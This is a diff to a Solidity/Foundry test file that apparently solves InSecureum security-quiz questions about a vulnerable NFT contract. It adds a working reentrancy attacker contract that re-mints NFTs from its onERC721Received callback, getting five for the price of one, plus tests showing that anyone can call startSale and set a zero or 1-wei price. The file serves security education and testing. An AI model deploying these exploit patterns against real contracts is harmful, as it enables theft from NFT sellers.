@@ -15,7 +15,7 @@ contract InSecureumNFTTestBase is Test {
 
 // NOTE Q1 does not require tests
 
-contract R3_Q2_ERC721TokenReceiver is ERC721TokenReceiver {
+contract R3_Q2_Buyer is ERC721TokenReceiver {
     InSecureumNFT nft;
     constructor(address _nft) payable {
         nft = InSecureumNFT(_nft);
@@ -41,7 +41,7 @@ contract R3_Q2_ERC721TokenReceiver is ERC721TokenReceiver {
 
 contract R3_Q2 is InSecureumNFTTestBase {
     uint INIT_SALE_PRICE = 10000;
-    R3_Q2_ERC721TokenReceiver buyerContract;
+    R3_Q2_Buyer buyerContract;
 
     function setUp() public override {
         // set to current timestamp on ethereum mainnet
@@ -49,7 +49,7 @@ contract R3_Q2 is InSecureumNFTTestBase {
         super.setUp();
         nft.startSale(INIT_SALE_PRICE);
         // deploy the buyer contract with some ether so it can buy some NFTs
-        buyerContract = new R3_Q2_ERC721TokenReceiver{value: 1 ether}(address(nft));
+        buyerContract = new R3_Q2_Buyer{value: 1 ether}(address(nft));
     }
 
     function test_BuyersCanRepeatedlyMintAndRevertUntilTheyReceiveDesiredNFT() public {
@@ -77,10 +77,12 @@ contract R3_Q2 is InSecureumNFTTestBase {
 
 // NOTE Q3 does not require tests
 
-contract R3_Q4_Reentrancy is ERC721TokenReceiver {
+contract R3_Q4_Attacker is ERC721TokenReceiver {
     InSecureumNFT nft;
     uint price;
     uint buyCount = 1;
+    uint[] internal mintedNFTs;
+
     constructor(address _nft, uint _price) payable {
         nft = InSecureumNFT(_nft);
         price = _price;
@@ -91,36 +93,100 @@ contract R3_Q4_Reentrancy is ERC721TokenReceiver {
                                 uint256 _tokenId, 
                                 bytes calldata _data) external returns(bytes4) {
         bytes4 retval = 0x11223344;
-        buyCount +=1;
-        // console.log("buyCount: ", buyCount);
+
         if(buyCount < nft.SALE_LIMIT()) {
-            // reenter nft contract here to keep buying more NFT without paying more
+            buyCount +=1;
+            // reenter nft contract here to keep buying more NFT 
+            // without sending any additional Ether value!
             uint id = nft.mint();
+            mintedNFTs.push(id);
             console.log(id);
         }
+
         return retval;
     }
 
-    function attack() public returns(uint) {
+    function attack() public {
         uint id = nft.mint{value: price}();
-        return id;
+        mintedNFTs.push(id);
+    }
+
+    function mintedNFTsCount() public returns(uint) {
+        return mintedNFTs.length;
     }
 
     receive() external payable {}
 }
 
 contract R3_Q4 is InSecureumNFTTestBase {
-    uint INIT_SALE_PRICE = 10000;
-    R3_Q4_Reentrancy attackerContract;
+    uint INIT_SALE_PRICE = 10_000;
+    R3_Q4_Attacker attackerContract;
 
     function setUp() public override {
         super.setUp();
         nft.startSale(INIT_SALE_PRICE);
         // deploy the attacker contract with some ether so it can buy some NFTs
-        attackerContract = new R3_Q4_Reentrancy{value: 1 ether}(address(nft), INIT_SALE_PRICE);
+        attackerContract = new R3_Q4_Attacker{value: INIT_SALE_PRICE}(address(nft), INIT_SALE_PRICE);
     }
+
     function test_SusceptibleToReentrancyDuringMinting() public {
+        assertEq(attackerContract.mintedNFTsCount(), 0);
+        // call attack to reenter into the nft contract multiple times
         attackerContract.attack();
-        // assert that have multiple nfts for the price of one
+        // attacker contract balance is 0 since it spent the available funds 
+        assertEq(address(attackerContract).balance, 0);
+        // assert attacker has sale limit (5) NFTs
+        assertEq(attackerContract.mintedNFTsCount(), nft.SALE_LIMIT());
+        // however, the benificiary only received payment for one NFT
+        assertEq(address(benificiary).balance, INIT_SALE_PRICE);
+    }
+}
+
+// NOTE Q5 does not require tests
+
+contract R3_Q6 is InSecureumNFTTestBase {
+    address attacker = makeAddr("attacker");
+
+    function test_startSaleCanBeCalledByAnyone() public {
+        assertFalse(nft.publicSale());
+
+        // can call and set price to 1 wei even if not the deployer
+        vm.prank(attacker);
+        nft.startSale(1);
+
+        // assert public sale is open and price is 1 wei
+        assertTrue(nft.publicSale());
+        assertEq(nft.getPrice(), 1);
+    }
+
+    function test_startSaleCanBeCalledWithZeroPrice() public {
+        assertFalse(nft.publicSale());
+        // calling start sale as the deployer with a zero price!
+        nft.startSale(0);
+
+        // assert public sale is open and price is 0
+        assertTrue(nft.publicSale());
+        assertEq(nft.getPrice(), 0);
+    }
+}
+
+// NOTE Q7 does not require tests
+
+contract R3_Q8 is InSecureumNFTTestBase {
+    address attacker1 = makeAddr("attacker1");
+    address attacker2 = makeAddr("attacker2");
+    function test_startSaleCanBeCalledByAnyoneAnyNumberOfTimes() public {
+        vm.prank(attacker1);
+        nft.startSale(1);
+
+        // assert price is 1 wei
+        assertEq(nft.getPrice(), 1);
+
+        // now attacker2 cals the startSale function again with a different price
+        vm.prank(attacker2);
+        nft.startSale(2);
+
+        // assert the price is now 2 wei after attacker2 calling startSale
+        assertEq(nft.getPrice(), 2);
     }
 }
